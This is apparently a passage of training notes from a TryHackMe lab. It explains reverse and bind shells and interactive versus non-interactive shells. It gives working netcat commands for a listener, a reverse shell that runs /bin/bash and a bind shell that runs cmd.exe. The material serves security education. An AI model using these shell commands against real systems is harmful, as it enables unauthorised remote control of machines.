At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.

Reverse shells
are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.

Bind shells 
are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

Reverse Shell example:

    On the attacking machine:
        sudo nc -lvnp 443

    On the target:
        nc <LOCAL-IP> <PORT> -e /bin/bash

Bind Shell example:
we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.

    On the target:
        nc -lvnp <port> -e "cmd.exe"

    On the attacking machine:
        nc MACHINE_IP <port>

The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.

Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

